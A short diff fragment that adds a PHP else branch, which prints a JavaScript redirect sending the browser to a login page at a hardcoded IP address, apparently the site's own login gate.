@@ -1,0 +1,9 @@
+<?php
+}else{
+?>
+<script>
+location.replace("http://183.82.9.60/ytv/login.php");
+</script>
+<?php
+}
+?>
